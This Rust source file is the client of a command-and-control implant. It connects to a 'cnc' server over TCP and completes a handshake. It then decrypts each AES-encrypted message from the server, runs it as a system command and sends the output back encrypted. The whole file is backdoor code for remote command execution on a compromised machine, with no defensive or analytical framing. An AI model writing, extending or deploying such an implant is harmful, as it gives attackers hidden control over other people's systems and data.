use sodiumoxide::crypto::aead::{Key, Nonce};
use std::process::Command;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;

use crate::crypto;

pub enum SocketState {
    Handshake(HandshakeState),
    Operational,
}

pub enum HandshakeState {
    ServerHello, // RSA public key
}

pub struct SocketStream<'a> {
    pub stream: TcpStream,
    pub aes_key: &'a Key,
    pub aes_nonce: &'a Nonce,
    state: SocketState,
}

impl<'a> SocketStream<'a> {
    pub fn new(stream: TcpStream, aes_key: &'a Key, aes_nonce: &'a Nonce) -> Self {
        Self {
            stream,
            state: SocketState::Handshake(HandshakeState::ServerHello),
            aes_key,
            aes_nonce,
        }
    }

    pub async fn consume_message(&self) -> Result<(Vec<u8>, usize), std::io::Error> {
        let mut data = vec![0; 1024];

        match self.stream.try_read(&mut data) {
            Err(e) => return Err(e),
            Ok(n_bytes) => {
                if n_bytes == 0 {
                    return Ok((vec![0u8], 0));
                }

                Ok((data, n_bytes))
            }
        }
    }

    pub async fn handle_msg(&mut self, msg: Vec<u8>, n_bytes: usize) {
        let trimmed = msg
            .get(..n_bytes)
            .unwrap()
            .split(|s| s == &(0 as u8))
            .next()
            .unwrap();
        let decrypted_msg =
            crypto::decrypt_from_aes(trimmed.to_vec(), &self.aes_key, &self.aes_nonce);

        let msg = String::from_utf8(decrypted_msg).unwrap();

        match &self.state {
            SocketState::Handshake(handshake_state) => match handshake_state {
                HandshakeState::ServerHello => {
                    if msg == "ACK" {
                        println!("Finished handshake successfully!");
                        self.state = SocketState::Operational;
                    }
                }
            },
            SocketState::Operational => {
                let output = Command::new(msg)
                    .output()
                    .expect("Failed to execute command");

                self.send_msg(output.stdout).await;
            }
        }
    }

    // worth noting msg param is not encrypted.
    pub async fn send_msg(&mut self, msg: Vec<u8>) {
        let encrypted: Vec<u8> = crypto::encrypt_with_aes(msg, self.aes_key, self.aes_nonce);

        self.stream.write_all(&encrypted).await.unwrap(); // TODO: Handle errors
    }
}
pub async fn connect_to_cnc(ip: &str, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
    let stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;

    Ok(stream)
}
